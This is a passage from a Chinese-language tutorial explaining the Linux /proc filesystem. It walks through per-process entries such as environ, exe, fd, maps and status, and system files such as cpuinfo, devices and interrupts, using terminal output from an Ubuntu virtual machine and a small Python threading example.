LOGWINDOWPATH=2HOME=/home/parallelsUSERNAME=parallelsIM_CONFIG_PHASE=1LANG=en_US.UTF-8LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:XDG_CURRENT_DESKTOP=ubuntu:GNOMEVTE_VERSION=6003GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/efc7691e_62d3_4da5_9b04_42e49e7c22f4INVOCATION_ID=f08b7a60bc574e1fbfd6211389c8f72bMANAGERPID=1971CLUTTER_IM_MODULE=ibusGJS_DEBUG_OUTPUT=stderrLESSCLOSE=/usr/bin/lesspipe %s %sXDG_SESSION_CLASS=userTERM=xterm-256colorLESSOPEN=| /usr/bin/lesspipe %sUSER=parallelsGNOME_TERMINAL_SERVICE=:1.88DISPLAY=:0SHLVL=1QT_IM_MODULE=ibusXDG_RUNTIME_DIR=/run/user/1000JOURNAL_STREAM=9:39754XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktopPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binGDMSESSION=ubuntuDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus_=/usr/bin/ping</code></pre><h4 id="PID-exe（重点）"><a href="#PID-exe（重点）" class="headerlink" title="/PID/exe（重点）"></a>/PID/exe（重点）</h4><p>exe — 指向启动当前进程的可执行文件（完整路径）的符号链接，通过/proc/N/exe可以启动当前进程的一个拷贝</p><pre><code>parallels@ubuntu:~$ sudo ls -l /proc/47878/ |grep exelrwxrwxrwx 1 root      root      0 May 31 14:36 exe -&gt; /usr/bin/ping</code></pre><h4 id="PID-fd（重点）"><a href="#PID-fd（重点）" class="headerlink" title="/PID/fd（重点）"></a>/PID/fd（重点）</h4><p>fd — 这是个目录，包含当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接</p><p>程序1是运行vim .bash_history，模拟程序调用文件执行情况</p><pre><code>parallels@ubuntu:~$ vi .bash_history poweroffpoweroffnetstat -antlpapt install net-toolssudo apt install net-toolsnetstat -antlpnetstat -lcat /etc/hostnamectl set-hostname ubuntuunameuname -apsps -acat /proc/43828/cmdlineps acat /proc/47878/cmdlinecat /proc/47878/environsudo cat /proc/47878/environuname -anetstat -inetstat -apunetstat -nunetstat -antlp</code></pre><p>通过fd/4可以看到，程序调用的文件的内容，但是里面的内容和原本被调用的文件中的内容存在一些差别，这里展示的行的顺序与源文件正好相反。这里只需要获取第一行～之后的文件目录地址即为程序所调用的文件。</p><pre><code>parallels@ubuntu:~$ sudo cat /proc/53421/fd/43210#&quot;! UtpTad��*arallelsubuntu~parallels/.bash_history�                T��������jd[XR94��������xkhbXQIB:-&#39;#� �  �   �    �     �      �       v        ^         F          -           )            &amp;� �  �   �    �     z      c       L        *         )          sudo ls -l /proc/43828 | grep cwdsudo ls -l /proc/43828sudo ls -a /proc/43828sudo ll /proc/43828sudo ls /proc/43828sudo ls /proc/43828 |grep cwdll /proc/43828 |grep cwdsudo ll /proc/43828 |grep cwdsudo  /proc/43828/cwdsudo cat /proc/43828/cwdlspwdsudo pwd /proc/43828/cwdsudo ls /proc/43828/cwdsudo ll /proc/43828/cwdsudo pwd /proc/43828/cwdlssudo ls /proc/43828/cwdsudo /proc/43828/cwdsudo cat /proc/43828/cwdcat /proc/43828/cwdcat /proc/43874/cat /proc/43874/cwdcat /proc/43874 cat /proc/43874/cmdline cat /proc/3078/cmdline ll /proc/3078/cmdline ll /proc/3078ps all /proc/43874ll /procll /proc/43874ps apsapsmore /proc/2674/cmdlinell /proc/4ll /proc/3ll /proc/2ll /proc/1ll /procps -efps parallelsps rootps 2ps 1ps1ps(1)ps -aux USERps -auxps -aups -auxps auxps --helpps -hpsping 8.8.8.8ping baidu.comnetstat -lnetstat -snetstat -gnetstat -antlpnetstat -nunetstat -apunetstat -iuname -asudo cat /proc/47878/environ cat /proc/47878/environ cat /proc/47878/cmdline ps acat /proc/43828/cmdline ps -apsuname -aunamehostnamectl set-hostname ubuntucat /etc/netstat -lnetstat -antlpsudo apt install net-toolsapt install net-toolsnetstat -antlppoweroffpoweroff</code></pre><h4 id="PID-limits"><a href="#PID-limits" class="headerlink" title="/PID/limits"></a>/PID/limits</h4><p>limits — 当前进程所使用的每一个受限资源的软限制、硬限制和管理单元；此文件仅可由实际启动当前进程的UID用户读取；（2.6.24以后的内核版本支持此功能） </p><pre><code>parallels@ubuntu:~$ sudo cat /proc/47878/limitsLimit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             15497                15497                processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       15497                15497                signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            us </code></pre><h4 id="PID-maps"><a href="#PID-maps" class="headerlink" title="/PID/maps"></a>/PID/maps</h4><p>maps — 当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表；</p><pre><code>parallels@ubuntu:~$ sudo cat /proc/47878/maps559da3c7a000-559da3c7d000 r--p 00000000 08:05 2622362                    /usr/bin/ping559da3c7d000-559da3c87000 r-xp 00003000 08:05 2622362                    /usr/bin/ping559da3c87000-559da3c8b000 r--p 0000d000 08:05 2622362                    /usr/bin/ping559da3c8b000-559da3c8c000 r--p 00010000 08:05 2622362                    /usr/bin/ping559da3c8c000-559da3c8d000 rw-p 00011000 08:05 2622362                    /usr/bin/ping559da3c8d000-559da3cb0000 rw-p 00000000 00:00 0 559da49bd000-559da49de000 rw-p 00000000 00:00 0                          [heap]7f453ba5f000-7f453ba61000 r--p 00000000 08:05 2628055                    /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so7f453ba61000-7f453ba65000 r-xp 00002000 08:05 2628055                    /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so7f453ba65000-7f453ba66000 r--p 00006000 08:05 2628055                    /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so7f453ba66000-7f453ba67000 r--p 00006000 08:05 2628055                    /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so7f453ba67000-7f453ba68000 rw-p 00007000 08:05 2628055                    /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so7f453ba68000-7f453ba69000 r--p 00000000 08:05 2628063                    /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.27f453ba69000-7f453ba6b000 r-xp 00001000 08:05 2628063                    /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.27f453ba6b000-7f453ba6c000 r--p 00003000 08:05 2628063                    /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.27f453ba6c000-7f453ba6d000 r--p 00003000 08:05 2628063                    /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.27f453ba6d000-7f453ba6e000 rw-p 00004000 08:05 2628063                    /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.27f453ba6e000-7f453ba71000 r--p 00000000 08:05 2628057                    /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so7f453ba71000-7f453ba78000 r-xp 00003000 08:05 2628057                    /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so7f453ba78000-7f453ba7a000 r--p 0000a000 08:05 2628057                    /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so7f453ba7a000-7f453ba7b000 r--p 0000b000 08:05 2628057                    /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so7f453ba7b000-7f453ba7c000 rw-p 0000c000 08:05 2628057                    /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so7f453ba7c000-7f453ba82000 rw-p 00000000 00:00 0 7f453ba82000-7f453c860000 r--p 00000000 08:05 2626626                    /usr/lib/locale/locale-archive7f453c860000-7f453c862000 rw-p 00000000 00:00 0 7f453c862000-7f453c866000 r--p 00000000 08:05 2627669                    /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.07f453c866000-7f453c879000 r-xp 00004000 08:05 2627669                    /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.07f453c879000-7f453c883000 r--p 00017000 08:05 2627669                    /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.07f453c883000-7f453c884000 r--p 00020000 08:05 2627669                    /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.07f453c884000-7f453c885000 rw-p 00021000 08:05 2627669                    /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.07f453c885000-7f453c8aa000 r--p 00000000 08:05 2627295                    /usr/lib/x86_64-linux-gnu/libc-2.31.so7f453c8aa000-7f453ca22000 r-xp 00025000 08:05 2627295                    /usr/lib/x86_64-linux-gnu/libc-2.31.so7f453ca22000-7f453ca6c000 r--p 0019d000 08:05 2627295                    /usr/lib/x86_64-linux-gnu/libc-2.31.so7f453ca6c000-7f453ca6d000 ---p 001e7000 08:05 2627295                    /usr/lib/x86_64-linux-gnu/libc-2.31.so7f453ca6d000-7f453ca70000 r--p 001e7000 08:05 2627295                    /usr/lib/x86_64-linux-gnu/libc-2.31.so7f453ca70000-7f453ca73000 rw-p 001ea000 08:05 2627295                    /usr/lib/x86_64-linux-gnu/libc-2.31.so7f453ca73000-7f453ca77000 rw-p 00000000 00:00 0 7f453ca77000-7f453ca7b000 r--p 00000000 08:05 2628239                    /usr/lib/x86_64-linux-gnu/libresolv-2.31.so7f453ca7b000-7f453ca8b000 r-xp 00004000 08:05 2628239                    /usr/lib/x86_64-linux-gnu/libresolv-2.31.so7f453ca8b000-7f453ca8e000 r--p 00014000 08:05 2628239                    /usr/lib/x86_64-linux-gnu/libresolv-2.31.so7f453ca8e000-7f453ca8f000 ---p 00017000 08:05 2628239                    /usr/lib/x86_64-linux-gnu/libresolv-2.31.so7f453ca8f000-7f453ca90000 r--p 00017000 08:05 2628239                    /usr/lib/x86_64-linux-gnu/libresolv-2.31.so7f453ca90000-7f453ca91000 rw-p 00018000 08:05 2628239                    /usr/lib/x86_64-linux-gnu/libresolv-2.31.so7f453ca91000-7f453ca93000 rw-p 00000000 00:00 0 7f453ca93000-7f453ca9f000 r--p 00000000 08:05 2627593                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.57f453ca9f000-7f453cb6d000 r-xp 0000c000 08:05 2627593                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.57f453cb6d000-7f453cbaa000 r--p 000da000 08:05 2627593                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.57f453cbaa000-7f453cbac000 r--p 00116000 08:05 2627593                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.57f453cbac000-7f453cbb1000 rw-p 00118000 08:05 2627593                    /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.57f453cbb1000-7f453cbb3000 r--p 00000000 08:05 2627316                    /usr/lib/x86_64-linux-gnu/libcap.so.2.327f453cbb3000-7f453cbb6000 r-xp 00002000 08:05 2627316                    /usr/lib/x86_64-linux-gnu/libcap.so.2.327f453cbb6000-7f453cbb7000 r--p 00005000 08:05 2627316                    /usr/lib/x86_64-linux-gnu/libcap.so.2.327f453cbb7000-7f453cbb8000 ---p 00006000 08:05 2627316                    /usr/lib/x86_64-linux-gnu/libcap.so.2.327f453cbb8000-7f453cbb9000 r--p 00006000 08:05 2627316                    /usr/lib/x86_64-linux-gnu/libcap.so.2.327f453cbb9000-7f453cbba000 rw-p 00007000 08:05 2627316                    /usr/lib/x86_64-linux-gnu/libcap.so.2.327f453cbba000-7f453cbbc000 rw-p 00000000 00:00 0 7f453cbcd000-7f453cbce000 r--p 00000000 08:05 2627082                    /usr/lib/x86_64-linux-gnu/ld-2.31.so7f453cbce000-7f453cbf1000 r-xp 00001000 08:05 2627082                    /usr/lib/x86_64-linux-gnu/ld-2.31.so7f453cbf1000-7f453cbf9000 r--p 00024000 08:05 2627082                    /usr/lib/x86_64-linux-gnu/ld-2.31.so7f453cbfa000-7f453cbfb000 r--p 0002c000 08:05 2627082                    /usr/lib/x86_64-linux-gnu/ld-2.31.so7f453cbfb000-7f453cbfc000 rw-p 0002d000 08:05 2627082                    /usr/lib/x86_64-linux-gnu/ld-2.31.so7f453cbfc000-7f453cbfd000 rw-p 00000000 00:00 0 7ffecd650000-7ffecd671000 rw-p 00000000 00:00 0                          [stack]7ffecd7eb000-7ffecd7ee000 r--p 00000000 00:00 0                          [vvar]7ffecd7ee000-7ffecd7ef000 r-xp 00000000 00:00 0                          [vdso]ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</code></pre><h4 id="PID-mem"><a href="#PID-mem" class="headerlink" title="/PID/mem"></a>/PID/mem</h4><p>mem — 当前进程所占用的内存空间，由open、read和lseek等系统调用使用，不能被用户读取</p><pre><code>parallels@ubuntu:~$ sudo cat /proc/47878/memcat: /proc/47878/mem: Input/output error</code></pre><h4 id="PID-root"><a href="#PID-root" class="headerlink" title="/PID/root"></a>/PID/root</h4><p>root — 指向当前进程运行根目录的符号链接；在Unix和Linux系统上，通常采用chroot命令使每个进程运行于独立的根目录</p><pre><code>parallels@ubuntu:~$ sudo ls -l /proc/47878/ |grep &quot;root -&quot;lrwxrwxrwx 1 root      root      0 May 31 14:36 root -&gt; /这里使用grep &quot;root -&quot;，是因为proc每一文件的归属用户也都是root，如下所示，不利于搜索-r--r--r-- 1 root      root      0 May 31 14:36 arch_status-rw-r--r-- 1 root      root      0 May 31 14:36 autogroup-r-------- 1 root      root      0 May 31 14:36 auxv-r--r--r-- 1 root      root      0 May 31 14:36 cgroup--w------- 1 root      root      0 May 31 14:36 clear_refs-r--r--r-- 1 root      root      0 May 31 14:25 cmdline-rw-r--r-- 1 root      root      0 May 31 14:36 comm</code></pre><h4 id="PID-stat"><a href="#PID-stat" class="headerlink" title="/PID/stat"></a>/PID/stat</h4><p>stat — 当前进程的状态信息，包含一系统格式化后的数据列，可读性差，通常由ps命令使用</p><pre><code>parallels@ubuntu:~$ sudo cat /proc/47878/stat47878 (ping) S 39281 47878 39281 34817 47878 4194304 160 0 0 0 42 208 0 0 20 0 1 0 1566795 18907136 710 18446744073709551615 94135545995264 94135546047281 140732344492352 0 0 0 0 0 8198 1 0 0 17 1 0 0 0 0 0 94135546067584 94135546069952 94135559901184 140732344501200 140732344501215 140732344501215 140732344504298 0</code></pre><h4 id="PID-statm"><a href="#PID-statm" class="headerlink" title="/PID/statm"></a>/PID/statm</h4><p>statm — 当前进程占用内存的状态信息，通常以“页面”（page）表示</p><pre><code>parallels@ubuntu:~$ sudo cat /proc/47878/statm4616 710 662 13 0 134 0</code></pre><h4 id="PID-status"><a href="#PID-status" class="headerlink" title="/PID/status"></a>/PID/status</h4><p>status — 与stat所提供信息类似，但可读性较好，如下所示，每行表示一个属性信息；其详细介绍请参见 proc的man手册页</p><pre><code>parallels@ubuntu:~$ sudo cat /proc/47878/statusName:   pingUmask:  0002State:  S (sleeping)Tgid:   47878Ngid:   0Pid:    47878PPid:   39281TracerPid:  0Uid:    1000    1000    1000    1000Gid:    1000    1000    1000    1000FDSize: 256Groups: 4 24 27 30 46 120 131 132 1000 NStgid: 47878NSpid:  47878NSpgid: 47878NSsid:  39281VmPeak:    18532 kBVmSize:    18464 kBVmLck:         0 kBVmPin:         0 kBVmHWM:      2872 kBVmRSS:      2840 kBRssAnon:         192 kBRssFile:        2648 kBRssShmem:          0 kBVmData:      404 kBVmStk:       132 kBVmExe:        52 kBVmLib:      2664 kBVmPTE:        60 kBVmSwap:        0 kBHugetlbPages:          0 kBCoreDumping:    0THP_enabled:    1Threads:    1SigQ:   0/15497SigPnd: 0000000000000000ShdPnd: 0000000000000000SigBlk: 0000000000000000SigIgn: 0000000000000000SigCgt: 0000000000002006CapInh: 0000000000000000CapPrm: 0000000000002000CapEff: 0000000000000000CapBnd: 0000003fffffffffCapAmb: 0000000000000000NoNewPrivs: 0Seccomp:    0Speculation_Store_Bypass:   vulnerableCpus_allowed:   ffffffffCpus_allowed_list:  0-31Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001Mems_allowed_list:  0voluntary_ctxt_switches:    9093nonvoluntary_ctxt_switches: 7</code></pre><h4 id="PID-task（重点）"><a href="#PID-task（重点）" class="headerlink" title="/PID/task（重点）"></a>/PID/task（重点）</h4><p>task — 目录文件，包含由当前进程所运行的每一个线程的相关信息，每个线程的相关信息文件均保存在一个由线程号（tid）命名的目录中，这类似于其内容类似于每个进程目录中的内容；（内核2.6版本以后支持此功能）</p><p>这里可以找一个python多线程程序测试，如下</p><pre><code>#!/usr/bin/python3import _threadimport time# 为线程定义一个函数def print_time( threadName, delay):   count = 0   while count &lt; 50:      time.sleep(delay)      count += 1      print (&quot;%s: %s&quot; % ( threadName, time.ctime(time.time()) ))# 创建两个线程try:   _thread.start_new_thread( print_time, (&quot;Thread-1&quot;, 2, ) )   _thread.start_new_thread( print_time, (&quot;Thread-2&quot;, 4, ) )except:   print (&quot;Error: 无法启动线程&quot;)while 1:   pass</code></pre><p>通过task可以看到</p><pre><code>parallels@ubuntu:~/Documents$ ls -l /proc/150666/task/total 0dr-xr-xr-x 7 parallels parallels 0 May 31 17:53 150666dr-xr-xr-x 7 parallels parallels 0 May 31 17:53 150667dr-xr-xr-x 7 parallels parallels 0 May 31 17:53 150668</code></pre><h4 id="apm"><a href="#apm" class="headerlink" title="/apm"></a>/apm</h4><p>apm — 高级电源管理（APM）版本信息及电池相关状态信息，通常由apm命令使用</p><p>buddyinfo — 用于诊断内存碎片问题的相关信息文件；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/buddyinfoNode 0, zone      DMA      1      0      1      0      2      1      1      1      0      1      3 Node 0, zone    DMA32    501    488    856    432     93     27      6      3      2      7    409 Node 0, zone   Normal     62     28     23     36    160     41     10      4      4      0      0 </code></pre><h4 id="cpuinfo"><a href="#cpuinfo" class="headerlink" title="/cpuinfo"></a>/cpuinfo</h4><p>cpuinfo — 处理器的相关信息的文件；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/cpuinfoprocessor   : 0vendor_id   : GenuineIntelcpu family  : 6model       : 126model name  : Intel(R) Core(TM) i7-1068NG7 CPU @ 2.30GHzstepping    : 5cpu MHz     : 2304.000cache size  : 8192 KBphysical id : 0siblings    : 2core id     : 0cpu cores   : 2apicid      : 0initial apicid  : 0fpu     : yesfpu_exception   : yescpuid level : 22wp      : yesflags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx rdtscp lm constant_tsc nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec dtherm arat pln ptsbugs        : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihitbogomips    : 4608.00clflush size    : 64cache_alignment : 64address sizes   : 36 bits physical, 48 bits virtualpower management:processor   : 1vendor_id   : GenuineIntelcpu family  : 6model       : 126model name  : Intel(R) Core(TM) i7-1068NG7 CPU @ 2.30GHzstepping    : 5cpu MHz     : 2304.000cache size  : 8192 KBphysical id : 0siblings    : 2core id     : 1cpu cores   : 2apicid      : 1initial apicid  : 1fpu     : yesfpu_exception   : yescpuid level : 22wp      : yesflags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx rdtscp lm constant_tsc nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec dtherm arat pln ptsbugs        : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihitbogomips    : 4608.00clflush size    : 64cache_alignment : 64address sizes   : 36 bits physical, 48 bits virtualpower management:</code></pre><h4 id="crypto"><a href="#crypto" class="headerlink" title="/crypto"></a>/crypto</h4><p>crypto — 系统上已安装的内核使用的密码算法及每个算法的详细信息列表；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/crypto name         : crct10difdriver       : crct10dif-pclmulmodule       : crct10dif_pclmulpriority     : 200refcnt       : 2selftest     : passedinternal     : notype         : shashblocksize    : 1digestsize   : 2name         : ghashdriver       : ghash-clmulnimodule       : ghash_clmulni_intelpriority     : 400refcnt       : 1selftest     : passedinternal     : notype         : ahashasync        : yesblocksize    : 16digestsize   : 16......</code></pre><h4 id="devices"><a href="#devices" class="headerlink" title="/devices"></a>/devices</h4><p>devices — 系统已经加载的所有块设备和字符设备的信息，包含主设备号和设备组（与主设备号对应的设备类型）名；</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/devices Character devices:  1 mem  4 /dev/vc/0  4 tty  4 ttyS  5 /dev/tty  5 /dev/console  5 /dev/ptmx  5 ttyprintk  6 lp  7 vcs 10 misc 13 input 21 sg 29 fb 81 video4linux 89 i2c 99 ppdev108 ppp116 alsa128 ptm136 pts180 usb189 usb_device204 ttyMAX226 drm238 media239 aux240 cec241 BaseRemoteCtl242 hidraw243 vfio244 bsg245 watchdog246 ptp247 pps248 rtc249 dma_heap250 dax251 dimmctl252 ndctl253 tpm254 gpiochipBlock devices:  7 loop  8 sd  9 md 11 sr 65 sd 66 sd 67 sd 68 sd 69 sd 70 sd 71 sd128 sd129 sd130 sd131 sd132 sd133 sd134 sd135 sd253 device-mapper254 mdp259 blkext</code></pre><h4 id="diskstats"><a href="#diskstats" class="headerlink" title="/diskstats"></a>/diskstats</h4><p>diskstats — 每块磁盘设备的磁盘I/O统计信息列表；（内核2.5.69以后的版本支持此功能）</p><pre><code>parallels@ubuntu:~/Documents$ sudo cat /proc/diskstats   7       0 loop0 43 0 690 13 0 0 0 0 0 56 13 0 0 0 0 0 0   7       1 loop1 382 0 10194 124 0 0 0 0 0 720 124 0 0 0 0 0 0   7       2 loop2 955 0 14846 150 0 0 0 0 0 968 150 0 0 0 0 0 0   7       3 loop3 43 0 696 16 0 0 0 0 0 32 16 0 0 0 0 0 0   7       4 loop4 55 0 2142 26 0 0 0 0 0 76 26 0 0 0 0 0 0   7       5 loop5 461 0 28720 115 0 0 0 0 0 1492 115 0 0 0 0 0 0   7       6 loop6 43 0 696 9 0 0 0 0 0 44 9 0 0 0 0 0 0   7       7 loop7 1433 0 27754 238 0 0 0 0 0 1928 238 0 0 0 0 0 0   8       0 sda 20271 9379 1610136 13409 20326 33553 2200738 29558 0 29804 43439 0 0 0 0 2943 471   8       1 sda1 164 1013 13014 32 3 0 10 0 0 84 32 0 0 0 0 0 0   8       2 sda2 2 0 4 0 0 0 0 0 0 8 0 0 0 0 0 0 0   8       5 sda5 20002 8366 1592930 13355 19597 33553 2200728 29500 0 29720 42856 0 0 0 0 0 0  11       0 sr0 11 0 5 1 0 0 0 0 0 24 1 0 0 0 0 0 0   7       8 loop8 2468 0 14116 193 0 0 0 0 0 1184 193 0 0 0 0 0 0   7       9 loop9 43 0 694 6 0 0 0 0 0 20 6 0 0 0 0 0 0   7      10 loop10 34 0 92 12 0 0 0 0 0 48 12 0 0 0 0 0 0</code></pre><h4 id="dma"><a href="#dma" class="headerlink" title="/dma"></a>/dma</h4><p>dma — 每个正在使用且注册的ISA DMA通道的信息列表；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/dma 4: cascade</code></pre><h4 id="execdomains"><a href="#execdomains" class="headerlink" title="/execdomains"></a>/execdomains</h4><p>execdomains — 内核当前支持的执行域（每种操作系统独特“个性”）信息列表；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/execdomains0-0 Linux               [kernel]</code></pre><h4 id="fb"><a href="#fb" class="headerlink" title="/fb"></a>/fb</h4><p>fb — 帧缓冲设备列表文件，包含帧缓冲设备的设备号和相关驱动信息；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/fb0 prldrmfb</code></pre><h4 id="filesystems"><a href="#filesystems" class="headerlink" title="/filesystems"></a>/filesystems</h4><p>filesystems — 当前被内核支持的文件系统类型列表文件，被标示为nodev的文件系统表示不需要块设备的支持；通常mount一个设备时，如果没有指定文件系统类型将通过此文件来决定其所需文件系统的类型；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/filesystemsnodev   sysfsnodev   tmpfsnodev   bdevnodev   procnodev   cgroupnodev   cgroup2nodev   cpusetnodev   devtmpfsnodev   configfsnodev   debugfsnodev   tracefsnodev   securityfsnodev   sockfsnodev   bpfnodev   pipefsnodev   ramfsnodev   hugetlbfsnodev   devpts    ext3    ext2    ext4    squashfs    vfatnodev   ecryptfs    fuseblknodev   fusenodev   fusectlnodev   mqueuenodev   pstorenodev   autofsnodev   prl_fs</code></pre><h4 id="interrupts"><a href="#interrupts" class="headerlink" title="/interrupts"></a>/interrupts</h4><p>interrupts — X86或X86_64体系架构系统上每个IRQ相关的中断号列表；多路处理器平台上每个CPU对于每个I/O设备均有自己的中断号；</p><pre><code>parallels@ubuntu:~/Documents$ cat /proc/interrupts           CPU0       CPU1         0:          5          0   IO-APIC   2-edge      timer  1:          0       2115   IO-APIC   1-edge      i8042  8:          1          0   IO-APIC   8-edge      rtc0  9:          0      54300   IO-APIC   9-fasteoi   acpi 12:        144          0   IO-APIC  12-edge      i8042 14:          0          0   IO-APIC  14-edge      ata_piix 15:          0          0   IO-APIC  15-edge      ata_piix 18:       4012       2072   IO-APIC  18-fasteoi   uhci_hcd:usb2 19:        221          0   IO-APIC  19-fasteoi   ehci_hcd:usb1 22:          0          0   IO-APIC  22-fasteoi   virtio1 25:          0      22667   PCI-MSI 49152-edge      prl_tg 26:         16         12   PCI-MSI 81920-edge      virtio0-config 27:       2970       3763   PCI-MSI 81921-edge      virtio0-input.0 28:       5404       4730   PCI-MSI 81922-edge      virtio0-output.0 29:          4         39   PCI-MSI 487424-edge      xhci_hcd 30:      35057      20716   PCI-MSI 512000-edge      ahci[0000:00:1f.2] 31:       7106      12055   PCI-MSI 524288-edge      prl_drm 32:      10323          0   PCI-MSI 516096-edge      snd_hda_intel:card0NMI:          0          0   Non-maskable interruptsLOC:    3819832    2976992   Local timer interruptsSPU:          0          0   Spurious interruptsPMI:          0          0   Performance monitoring interruptsIWI:          0          4   IRQ work interruptsRTR:          0          0   APIC ICR read retriesRES:     401643     455360   Rescheduling interruptsCAL:     168695     247341   Function call interruptsTLB:       5109       4875   TLB shootdownsTRM:          0          0   Thermal event interruptsTHR:          0          0   Threshold APIC 